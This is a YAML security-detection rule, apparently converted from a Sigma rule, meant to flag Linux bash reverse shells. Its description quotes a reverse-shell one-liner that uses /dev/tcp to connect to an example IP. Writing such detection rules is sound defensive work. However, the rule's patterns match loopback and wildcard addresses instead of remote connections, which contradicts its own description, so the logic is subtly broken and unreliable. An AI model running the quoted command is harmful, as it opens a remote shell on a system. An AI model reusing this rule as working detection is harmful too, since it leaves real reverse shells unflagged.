id: SIGMA-LIN-LINUX_REVERSE_SHELL
title: Linux Reverse Shell Indicator
category: network
subcategory: execution
mitre_technique: T1059.004
mitre_tactic: execution
severity: critical
confidence: low
enabled: true
description: Detects a bash contecting to a remote IP address (often found when actors
  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
service: linux
detection:
  type: pattern
  patterns:
  - regex: /bin/bash
  - regex: 127\.0\.0\.1
  - regex: 0\.0\.0\.0
false_positives:
- Unknown
recommendation: 'Review the activity matching this rule. Original Sigma rule: rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml.
  References: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md'
references:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
tags:
- attack.execution
- attack.t1059.004
